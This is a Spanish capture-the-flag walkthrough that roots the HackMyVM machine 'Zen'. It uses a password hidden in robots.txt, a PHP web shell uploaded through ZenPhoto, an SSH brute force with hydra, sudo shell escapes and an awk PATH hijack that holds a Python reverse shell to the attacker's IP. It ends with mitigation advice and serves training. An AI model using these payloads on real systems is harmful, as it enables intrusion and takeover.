
# Writeup: Máquina Zen - HackMyVM

En este writeup rootearemos la máquina **Zen** de la plataforma HackMyVM. El acceso inicial será sencillo a través de una contraseña débil oculta en el `robots.txt`, mientras que la escalada de privilegios constará de una cadena de tres pivoteos laterales mediante sudo mal configurado y un secuestro del PATH para alcanzar root.

## Reconocimiento Inicial

Vamos con `nmap` para descubrir puertos abiertos con servicios expuestos:

```bash
$> nmap -p- --open -sSCV -n -Pn 192.168.0.30 -oN tcpScan
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 c3:a0:ac:5d:25:92:47:2c:f5:70:ba:1b:f0:a3:b9:67 (RSA)
|   256 03:72:ad:7b:df:46:5d:b3:2a:9b:69:a9:c4:11:35:86 (ECDSA)
|_  256 4b:a1:81:88:73:2a:a0:b6:5c:9f:30:d9:c9:7f:1f:3f (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: Galería
| http-robots.txt: 9 disallowed entries 
| /albums/ /plugins/ /P@ssw0rd /themes/ /zp-core/ 
|_/zp-data/ /page/search/ /uploaded/ /backup/
|_http-server-header: nginx/1.14.2
```

El escaneo nos revela dos puertos abiertos: SSH (22) y HTTP (80). Vemos varias rutas internas deshabilitadas en el `robots.txt`, incluyendo una bastante sospechosa: `/P@ssw0rd`.

Al visitar la web en el navegador confirmo el uso de ZenPhoto como gestor de contenidos. Inspeccionando el código fuente con `Ctrl+U` puedo ver la versión exacta: **ZenPhoto 1.5.7**. Existen vulnerabilidades para esta versión, pero necesitamos estar autenticados. 

Pruebo ahora con los directorios revelados por el `robots.txt`, y todos devuelven `403 Forbidden` excepto dos:
- `/P@ssw0rd` → `404 Not Found`
- `/zp-core` → accesible

El hecho de que `/P@ssw0rd` devuelva 404 en lugar de un 403 es bastante raro, la ruta no existe como directorio real pero está deshabilitada?

Antes de nada vamos a completar la enumeración, fuzzeamos el directorio `/zp-core/`:

```bash
$> gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.0.30/zp-core/ -x txt,php -r
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
admin.php            (Status: 200) [Size: 7779]
license.php          (Status: 200) [Size: 3865]
setup.php            (Status: 200) [Size: 1651]
htaccess             (Status: 200) [Size: 624]
===============================================================
Finished
===============================================================
```

Quitando los resultados con 0 caracteres y status code 4xx/5xx hemos descubierto 4 rutas a investigar. Solamente es de interés `admin.php`, que es el panel de autenticación del CMS. Probamos credenciales básicas como admin:admin, admin:password,... pero nada. 

## Acceso inicial

Antes nos ha llamado la atención que `/P@ssw0rd` era la única ruta del robots.txt que nos devolvía status code 404, vamos a probarlo como contraseña también... y voilà. Las credenciales `admin:P@ssw0rd` son válidas para el panel de administración de ZenPhoto.

Estamos autenticados y, como hemos dicho antes, sabemos que existen vulnerabilidades de arbitrary file upload. Un poco de investigación en internet nos explica cómo explotar la vulnerabilidad: simplemente necesitamos activar el plugin 'elFinder', lo que nos permite subir un php malicioso en el apartado Themes.

```php
<?php system($_REQUEST['cmd']); ?>
```

Verificamos el RCE desde nuestra máquina:

```bash
$> curl -s http://192.168.0.30/themes/shell.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Ya podemos lanzarnos una reverse shell, obteniendo acceso como `www-data` en la máquina objetivo.


## Escalada de Privilegios

### a) de `www-data` a `zenmaster`

Enumero el sistema manualmente pero encuentro poca cosa. Hay tres usuarios con shell a parte de `root`:

```bash
www-data@zen:~$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
kodo:x:1000:1000:kodo,,,:/home/kodo:/bin/bash
zenmaster:x:1001:1001:,,,:/home/zenmaster:/bin/bash
hua:x:1002:1002:,,,:/home/hua:/bin/bash
```

Hemos visto que la puerta de entrada ha sido el uso de credenciales débiles, quizá esta falla sea persistente. Al no encontrar nada en el sistema, vamos a probar un ataque de fuerza bruta contra SSH usando `hydra`. Creamos un archivo `users` con las líneas `kodo`, `zenmaster` y `hua`. Antes de usar un diccionario de contraseñas, para no hacer tanto ruido vamos a probar con el mismo archivo `users` como lista de contraseñas.

```bash
hydra -L users -P users ssh://192.168.0.30
```

En pocos segundos `hydra` encuentra las credenciales `zenmaster:zenmaster`. Accedemos por SSH y leemos la primera flag.

### b) de `zenmaster` a `kodo`

Veamos los privilegios de sudo:

```bash
zenmaster@zen:~$ sudo -l
User zenmaster may run the following commands on zen:
    (kodo) NOPASSWD: /bin/bash
```

`zenmaster` puede ejecutar `/bin/bash` como el usuario `kodo` sin contraseña. Trivial:

```bash
zenmaster@zen:~$ sudo -u kodo /bin/bash
kodo@zen:~$
```

### c) de `kodo` a `hua`

De nuevo miramos los permisos de sudo:

```bash
kodo@zen:~$ sudo -l
User kodo may run the following commands on zen:
    (hua) NOPASSWD: /usr/bin/see

kodo@zen:~$ ls -l /usr/bin/see
lrwxrwxrwx 1 root root 11 Feb  9  2019 /usr/bin/see -> run-mailcap
```

El binario `/usr/bin/see` es un enlace simbólico a `run-mailcap`. Según GTFOBins, al igual que `vim` o `less`, `run-mailcap` permite ejecutar comandos desde el visor de archivos. Lo explotamos de la siguiente forma:

```bash
kodo@zen:~$ sudo -u hua /usr/bin/see /etc/hostname # cualquier archivo sirve
```

Después escribimos el comando de escape:

```bash
!/bin/bash
```

Lo que nos proporciona una shell como el usuario `hua`.

### d) de `hua` a `root`

De nuevo verificamos los privilegios de sudo de `hua`:

```bash
hua@zen:~$ sudo -l
User hua may run the following commands on zen:
    (ALL : ALL) NOPASSWD: /usr/sbin/add-shell zen
```

`hua` puede ejecutar `/usr/sbin/add-shell zen` como cualquier usuario. Para entender qué hace internamente, lo analizamos con `strace` y enseguida llaman la atención las siguientes líneas:

```bash
hua@zen:~$ strace /usr/sbin/add-shell zen
...
stat("/usr/local/sbin/awk", 0x7ffc3700cca0) = -1 ENOENT (No such file or directory)
stat("/usr/local/bin/awk", 0x7ffc3700cca0) = -1 ENOENT (No such file or directory)
stat("/usr/sbin/awk", 0x7ffc3700cca0)   = -1 ENOENT (No such file or directory)
stat("/usr/bin/awk", {st_mode=S_IFREG|0755, st_size=674624, ...}) = 0
...
```

El binario busca `awk` en `/usr/local/sbin`, `/usr/local/bin` y `/usr/sbin` antes de encontrarlo en `/usr/bin`, lo que es coherente con el path (`awk` se invoca sin ruta absoluta):

```bash
hua@zen:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Esto significa que podemos crear un archivo 'awk' en cualquiera de los tres primeros directorios que nos proporcione una shell. `hua` no tiene permisos de escritura en `/usr/local/sbin`, pero sí en `/usr/local/bin`, así que creamos aquí un script malicioso con una reverse shell en Python. Uso este payload de [PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet):

```bash
hua@zen:~$ echo 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.43\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"' > /usr/local/bin/awk
hua@zen:~$ chmod +x /usr/local/bin/awk
```

Levantamos un listener en nuestra máquina atacante y ejecutamos el binario con privilegios:

```bash
# Máquina atacante:
nc -lvnp 1234

# Máquina víctima:
hua@zen:~$ sudo /usr/sbin/add-shell zen
```

Así conseguimos finalmente la shell como `root` y obtenemos su flag.
 

## Detección y Mitigación

- Credenciales ocultas en el `robots.txt` (`/P@ssw0rd`) — nunca incluir secretos en recursos accesibles sin autenticación
- Contraseña débil y coincidente con el usuario (`admin:P@ssw0rd`, `zenmaster:zenmaster`) — exigir complejidad mínima y bloquear coincidencia usuario/contraseña
- Plugin elFinder activo sin necesidad operativa — desactivarlo si no se usa; si se usa, bloquear la ejecución de scripts
- Cadena de sudo sin contraseña de extremo a extremo (`zenmaster → kodo → hua → root`) — limitar las reglas de sudo a tareas operativas reales y revisarlas periódicamente
- Shell escape vía `run-mailcap` (`/usr/bin/see`) — no delegar por sudo visores o paginadores interactivos, ya que equivale a delegar una shell completa
- Resolución insegura de `awk` por PATH en `add-shell` — usar siempre rutas absolutas en scripts que se ejecutan con privilegios elevados
